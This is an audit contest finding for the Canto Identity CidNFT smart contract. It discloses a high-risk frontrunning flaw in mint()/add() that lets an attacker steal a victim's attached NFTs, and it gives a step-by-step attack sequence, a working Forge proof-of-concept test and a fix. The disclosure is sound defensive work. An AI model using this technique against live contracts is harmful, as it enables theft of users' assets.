## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-01

# [Attacker can frontrun a victim's mint+add transaction to steal NFT](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67) 

# Lines of code

https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L147
https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L165
https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L237


# Vulnerability details

## Impact
High - an attacker can steal deposited NFTs from victims using the `mint()` + `add()` functionality in `CidNFT.sol`

## Proof of Concept

One of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their `CidNFT`. The `CidNFT` contract custodies these attached NFTs, and they are regarded as "traits" of the user. 

The protocol currently includes functionality for a user to mint a `CidNFT` as their identity and then optionally add a subprotocol NFT to that `CidNFT` in the same transaction. This occurs in the `mint()` function of `CidNFT.sol`, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`. 
```

function mint(bytes[] calldata _addList) external {
    _mint(msg.sender, ++numMinted); 
    bytes4 addSelector = this.add.selector;
    for (uint256 i = 0; i < _addList.length; ++i) {
        (bool success /*bytes memory result*/, ) = address(this)
            .delegatecall(abi.encodePacked(addSelector, _addList[i]));
        if (!success) revert AddCallAfterMintingFailed(i);
    }
}
```
One of the arguments for `add()` is the `_cidNFTID` to which the user would like to attach their outside NFT. However, `_cidNFTID` is specified in calldata to `mint()`, and there is no guarantee that the user is actually `add()`ing to the `CidNFT` that they just minted. There is only a check in `add()` that the user is either the owner or approved for that `CidNFT`. 


```
function add(
        uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user
        string calldata _subprotocolName,
        uint256 _key,
        uint256 _nftIDToAdd,
        AssociationType _type
    ) external {
    ...............
    if (
        cidNFTOwner != msg.sender &&
        getApproved[_cidNFTID] != msg.sender &&
        !isApprovedForAll[cidNFTOwner][msg.sender]
    ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);
    ...............
}
```

This opens up the following attack:

1. Victim sends a transaction expecting to mint `CidNFT #100`, and includes calldata to `add()` their SubprotocolNFT to the token in the same tx
2. Attacker frontruns this transaction with a `mint()` with no `add()` parameters, receives `CidNFT #100`, and sets the victim as approved for that token
3. The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100
4. The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract
5. The attacker can then either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves

Below is a forge test executing this attack. This should run if dropped into `CidNFT.t.sol`.
```
function testMaliciousMint() public {
    uint256 cidTokenId = cidNFT.numMinted() + 1;
    (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);
    (uint256 key1, uint256 key2) = (1, 2);

    // user1 == attacker
    // user2 == victim
    // Frontrun the victim's mint by minting the cidNFT token they expect before them
    vm.startPrank(user1);
    cidNFT.mint(new bytes[](0));

    // Set the victim (user2) as approved for the token user1 just minted
    cidNFT.setApprovalForAll(user2, true);
    vm.stopPrank();

    // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract
    // for the subtokens, and prepare the addlist with the incorrect cidNFT token id
    vm.startPrank(user2);
    sub1.mint(user2, subTokenId1);
    sub1.mint(user2, subTokenId2);
    sub1.setApprovalForAll(address(cidNFT), true);

    bytes[] memory addList = new bytes[](2);
    addList[0] = abi.encode(
        cidTokenId,
        "sub1",
        key1,
        subTokenId1,
        CidNFT.AssociationType.ORDERED
    );
    addList[1] = abi.encode(
        cidTokenId,
        "sub1",
        key2,
        subTokenId2,
        CidNFT.AssociationType.ORDERED
    );

    // Mint user2 a new CidNFT and attach the subtokens to user1's CidNFT
    cidNFT.mint(addList);
    vm.stopPrank();

    // Confirm that user1's CidNFT has the subtokens and can transfer them out
    vm.startPrank(user1);
    cidNFT.remove(
        cidTokenId,
        "sub1",
        key1,
        subTokenId1,
        CidNFT.AssociationType.ORDERED
    );
    cidNFT.remove(
        cidTokenId,
        "sub1",
        key2,
        subTokenId2,
        CidNFT.AssociationType.ORDERED
    );
    vm.stopPrank();

    // Confirm that user1 now holds the subtokens
    assertEq(cidNFT.ownerOf(cidTokenId), user1);
    assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);
    assertEq(sub1.ownerOf(subTokenId1), user1);
    assertEq(sub1.ownerOf(subTokenId2), user1);
}
## Tools Used
Manual review

## Recommended Mitigation Steps
- Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs